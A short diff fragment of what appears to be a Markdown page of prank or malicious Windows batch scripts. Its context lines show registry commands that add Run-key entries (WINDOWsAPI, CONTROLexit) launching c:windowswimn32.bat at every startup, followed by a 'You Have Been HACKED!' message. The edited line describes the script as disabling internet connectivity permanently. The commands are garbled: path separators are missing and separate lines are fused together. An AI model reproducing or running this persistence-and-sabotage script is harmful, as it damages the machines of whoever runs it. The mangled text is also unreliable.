@@ -13,7 +13,7 @@ hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg
 hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
 PAUSE
 ```
-### 🃏Action :-  This 11:27 AM 30-07-202311:28 AM 30-07-202322 will disable the internet connectivity permanently.
+### 🃏Action :-  This will disable the internet connectivity permanently.
 
 
 
